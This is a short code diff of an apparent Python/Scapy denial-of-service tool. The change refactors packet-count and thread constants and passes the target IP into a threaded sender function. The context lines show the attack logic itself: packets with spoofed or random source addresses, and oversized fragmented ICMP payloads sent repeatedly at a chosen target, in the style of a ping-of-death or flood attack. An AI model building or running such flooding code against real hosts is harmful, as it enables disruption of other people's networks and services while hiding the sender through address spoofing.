@@ -29,22 +29,25 @@ args = parser.parse_args()
 ---------FUNCTIONS---------
 """
 
+N_THREADS = 5
+N_PACKETS = 50
+
 #threads
 def thread_delay(thread_name, delay, ip):
 	time.sleep(delay)
 
 	if args.source:
 		print("Diplaying source as: % s" % args.source)
-		ip_layer = IP(dst=args.ip, src=args.source)
+		ip_layer = IP(dst=ip, src=args.source)
 	else:
-		ip_layer = IP(dst=args.ip, src=RandIP("192.168.10.10/24"))
+		ip_layer = IP(dst=ip, src=RandIP("192.168.10.10/24"))
 
 
 	if args.number:
 		numPackets = args.number
 
 	else:
-		numPackets = 50
+		numPackets = N_PACKETS
 
 	if args.icmp:
  		send(numPackets*(fragment(ip_layer/ICMP()/"X"*60000)))
@@ -162,7 +165,7 @@ if args.ip:
 		numPackets = args.number
 
 	else:
-		numPackets = 50
+		numPackets = N_PACKETS
 	
 
 	if args.icmp:
